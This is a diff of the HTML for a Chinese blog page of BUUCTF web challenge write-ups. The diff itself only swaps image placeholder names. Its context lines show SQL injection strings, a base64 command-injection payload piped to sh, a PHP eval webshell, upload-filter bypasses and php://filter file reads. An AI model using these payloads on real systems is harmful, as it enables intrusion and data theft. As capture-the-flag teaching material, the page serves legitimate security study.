 <a class="tag-link" target="_blank" href="/π.html?omnitrix=aHR0cHM6Ly93d3cudG9ybmFkb3dlYi5vcmcvZW4vbGF0ZXN0L2d1aWRlL3NlY3VyaXR5Lmh0bWwjYXV0aGVudGljYXRpb24tYW5kLXNlY3VyaXR5Lw==" rel="external nofollow noopener noreferrer">
     <div class="tag-link-tips">引用站外链接</div>
     <div class="tag-link-bottom">
@@ -2890,7 +2890,7 @@ md5(cookie_secret+md5(filename))</p>
     </a>
 <h2 id="ACTF2020-新生赛-BackupFile"><a class="headerlink" href="#ACTF2020-新生赛-BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2>
 <p>扫目录</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202042219285.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202042219285.avif" alt="" loading="lazy"></p>
 <p>/index.php.bak</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">include_once</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
@@ -2945,7 +2945,7 @@ Your password is ‘geek’</p>
 <pre class="language-none"><code class="language-none">Hello 1cl4yi_want_to_play_2077,2sqlsql_injection_is_so_fun,3porndo_you_know_pornhub,4gitgithub_is_different_from_pornhub,5Stopyou_found_flag_so_stop,6badguyi_told_you_to_stop,7hackerhack_by_cl4y,8flagflag{792d2355-89eb-4b4e-b89a-96437b387278}！</code></pre>
 <h2 id="极客大挑战-2019-PHP"><a class="headerlink" href="#极客大挑战-2019-PHP"></a>[极客大挑战 2019]PHP</h2>
 <p>扫出来个 <code>www.zip</code></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202032132822.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202032132822.avif" alt="" loading="lazy"></p>
 <p>给了相关源码</p>
 <p>/index.php</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -3073,9 +3073,9 @@ Your password is ‘geek’</p>
         <i class="solitude st-arrow-right-bold"></i>
     </div>
     </a>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202020005603.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202020005603.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">calc.php?%20num=var_dump(scandir(chr(47)))</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202020005857.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202020005857.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">calc.php?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></pre>
 <h2 id="极客大挑战-2019-LoveSQL"><a class="headerlink" href="#极客大挑战-2019-LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2>
 <pre class="language-none"><code class="language-none">?username=admin&amp;password=-1%27+or+1%3D1+%23</code></pre>
@@ -3228,7 +3228,7 @@ string(0) “”<br>
 </ol>
 <p>/?ip=1.1.1.1|echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$9-d|sh</p>
 <p>Linux 下存在多种 Shell 程序，选择可用 Shell 即可</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201241948756.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201241948756.avif" alt="" loading="lazy"></p>
 <p>内部域分隔符 IFS(Internal Field Separator) Linux 的 env 变量，bash shell 下默认为空格、制表符和换行符</p>
 <h2 id="ACTF2020-新生赛-Exec"><a class="headerlink" href="#ACTF2020-新生赛-Exec"></a>[ACTF2020 新生赛]Exec</h2>
 <p><code>1.1.1.1;cat /flag</code></p>
@@ -3278,8 +3278,8 @@ string(0) “”<br>
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span></code></pre>
 <p>绕过相应检测</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201202149797.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201202213062.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201202149797.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201202213062.avif" alt="" loading="lazy"></p>
 <h2 id="极客大挑战-2019-Upload"><a class="headerlink" href="#极客大挑战-2019-Upload"></a>[极客大挑战 2019]Upload</h2>
 <p>upload_file.php</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -3330,16 +3330,16 @@ string(0) “”<br>
 <p>最后将合法文件移动至 upload 目录下</p>
 <p>可用 ASPX 一句话，后缀为 phtml ，文件头修改为 GIF89a?</p>
 <p>上传时将 Content-Type 参数改为 image/jpeg</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201201942169.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201201942232.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205202019222.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201201942169.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201201942232.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205202019222.avif" alt="" loading="lazy"></p>
 <h2 id="极客大挑战-2019-Knife"><a class="headerlink" href="#极客大挑战-2019-Knife"></a>[极客大挑战 2019]Knife</h2>
 <p>/index.php</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"Syc"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span></code></pre>
 <p>一句话木马，通过蚁剑连接</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205202009514.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205202009514.avif" alt="" loading="lazy"></p>
 <h2 id="极客大挑战-2019-Secret-File"><a class="headerlink" href="#极客大挑战-2019-Secret-File"></a>[极客大挑战 2019]Secret File</h2>
 <pre class="language-none"><code class="language-none">&lt;a id="master" href="./Archive_room.php" xxx&lt;/a&gt;</code></pre>
 <p>跳转至 Archive_room.php</p>
@@ -3348,7 +3348,7 @@ string(0) “”<br>
 <ol>
 <li>Burp拦截</li>
 </ol>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201191521081.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201191521081.avif" alt="" loading="lazy"></p>
 <p>/secr3t.php</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>  
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>  
@@ -3365,11 +3365,11 @@ string(0) “”<br>
 <ol start="2">
 <li>php://filter获取源码</li>
 </ol>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201191536121.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201191536121.avif" alt="" loading="lazy"></p>
 <ol start="3">
 <li>flag and secr3t</li>
 </ol>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201191527778.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201191527778.avif" alt="" loading="lazy"></p>
 <h2 id="ACTF2020-新生赛-Include"><a class="headerlink" href="#ACTF2020-新生赛-Include"></a>[ACTF2020 新生赛]Include</h2>
 <ol>
 <li>hint</li>
@@ -3393,21 +3393,21 @@ string(0) “”<br>
     </div>
     </a>
 <p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201191257767.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201191257767.avif" alt="" loading="lazy"></p>
 <h2 id="SUCTF-2019-EasySQL"><a class="headerlink" href="#SUCTF-2019-EasySQL"></a>[SUCTF 2019]EasySQL</h2>
 <ol>
 <li>var_dump</li>
 </ol>
 <p>回显格式反推出使用 var_dump 实现输出</p>
 <p>拿字典跑了下，屏蔽了某些关键词</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201172312174.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201172312174.avif" alt="" loading="lazy"></p>
 <ol start="2">
 <li>堆叠注入</li>
 </ol>
 <pre class="language-none"><code class="language-none">query=1;show databases #</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201171753535.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201171753535.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">query=-1; show tables #</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201171801924.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201171801924.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">query=-1; show columns from Flag #</code></pre>
 <p>from 被过滤，不可行</p>
 <a class="tag-link" target="_blank" href="/π.html?omnitrix=aHR0cHM6Ly91Y2FzZXJzLmNuL2J1dWN0Zi13ZWIlRTklQTIlOTglRTglQTclQTMlRTYlQjMlOTUlRTYlQjElODclRTYlODAlQkIvI3RpdGxlLTMv" rel="external nofollow noopener noreferrer">
@@ -3425,20 +3425,20 @@ string(0) “”<br>
     </a>
 <pre class="language-none"><code class="language-none">$sql = "select ".$post['query']."||flag from Flag";</code></pre>
 <pre class="language-none"><code class="language-none">1;set sql_mode=PIPES_AS_CONCAT;select 1</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201172337321.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201172337321.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">*,1
 
 select \*,1 from Flag</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201172340190.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201172340190.avif" alt="" loading="lazy"></p>
 <h2 id="极客大挑战-2019-EasySQL"><a class="headerlink" href="#极客大挑战-2019-EasySQL"></a>[极客大挑战 2019]EasySQL</h2>
 <p>/check.php?username=admin&amp;password=%27+or+1%3D1</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205191653337.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205191653337.avif" alt="" loading="lazy"></p>
 <p>/check.php?username=admin&amp;password=%27+or+1%3D1+%23</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205191722052.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205191722052.avif" alt="" loading="lazy"></p>
 <h2 id="极客大挑战-2019-Http"><a class="headerlink" href="#极客大挑战-2019-Http"></a>[极客大挑战 2019]Http</h2>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205191636126.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205191636126.avif" alt="" loading="lazy"></p>
 <p>href=“Secret.php”</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205191633549.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205191633549.avif" alt="" loading="lazy"></p>
 <p>It doesn’t come from ‘<a target="_blank" rel="external nofollow noopener noreferrer" href="/π.html?omnitrix=aHR0cHM6Ly9TeWNzZWNyZXQuYnV1b2ouY24=">https://Sycsecret.buuoj.cn</a>’</p>
 <a class="tag-link" target="_blank" href="/π.html?omnitrix=aHR0cHM6Ly9rYi5jbmJsb2dzLmNvbS9wYWdlLzkyMzIwLw==" rel="external nofollow noopener noreferrer">
     <div class="tag-link-tips">引用站外链接</div>
@@ -3454,11 +3454,11 @@ select \*,1 from Flag</code></pre>
     </div>
     </a>
 <p>Referer: <a target="_blank" rel="external nofollow noopener noreferrer" href="/π.html?omnitrix=aHR0cHM6Ly9TeWNzZWNyZXQuYnV1b2ouY24=">https://Sycsecret.buuoj.cn</a></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201191605723.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201191605723.avif" alt="" loading="lazy"></p>
 <p>Please use “Syclover” browser</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201191609826.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201191609826.avif" alt="" loading="lazy"></p>
 <p>No!!! you can only read this locally!!!</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202201191612812.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202201191612812.avif" alt="" loading="lazy"></p>
 <h2 id="极客大挑战-2019-Havefun"><a class="headerlink" href="#极客大挑战-2019-Havefun"></a>[极客大挑战 2019]Havefun</h2>
 <pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--
         $cat=$_GET['cat'];
@@ -3468,7 +3468,7 @@ select \*,1 from Flag</code></pre>
         }
         --&gt;</span></code></pre>
 <p>?cat=dog</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205191624967.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205191624967.avif" alt="" loading="lazy"></p>
 <h2 id="HCTF-2018-WarmUp"><a class="headerlink" href="#HCTF-2018-WarmUp"></a>[HCTF 2018]WarmUp</h2>
 <pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--source.php--&gt;</span></code></pre>
 <p>/source.php</p>
@@ -3524,7 +3524,7 @@ select \*,1 from Flag</code></pre>
 <p>/hint.php</p>
 <p>flag not here, and flag in ffffllllaaaagggg</p>
 <p>?file=hint.php?../…/…/…/…/ffffllllaaaagggg</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205191620028.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205191620028.avif" alt="" loading="lazy"></p>
 </article><div class="post-copyright"><div class="post-copyright__author_group"><a class="post-copyright__author_img" href="/about/"><img class="post-copyright__author_img_front" src="https://assets.btwoa.com/gif/avatar.gif"></a><div class="post-copyright__author_name">放养平凡</div><div class="post-copyright__author_desc">世界为你简单</div></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div id="quit-box" onclick="RemoveRewardMask()"></div><div class="post-reward"><div class="reward-button" title="赞赏作者" onclick="AddRewardMask()"><i class="solitude st-hand-heart-fill"></i>赞赏作者</div><div class="reward-main"><ul class="reward-all"><span class="reward-title">打赏记录</span><ul class="reward-group"><li class="reward-item"><a target="_blank" rel="noopener" href="https://qr.alipay.com/fkx15126n508tg71msclid8"><img class="post-qr-code-img nolazyload" src="https://assets.btwoa.com/zfbskm.avif" alt="支付宝" style="border-color: var(--efu-blue)"></a><div class="post-qr-code-desc">支付宝</div></li><li class="reward-item"><a href="wxp://f2f0llDMyIPjyOVk_q_hRZXvdDCOSzfQdb-CfPvC4wfRJ40"><img class="post-qr-code-img nolazyload" src="https://assets.btwoa.com/wxskm.avif" alt="微信" style="border-color: var(--efu-green)"></a><div class="post-qr-code-desc">微信</div></li></ul><a class="reward-main-btn" href="/about"><div class="reward-text">赞赏名单</div><div class="reward-dec">你的支持是我前进路上不可或缺的动力</div></a></ul></div></div><script>function RemoveRewardMask() {
     let rewardMainElements = document.querySelectorAll(".reward-main");
     let quitBoxElement = document.querySelector("#quit-box");
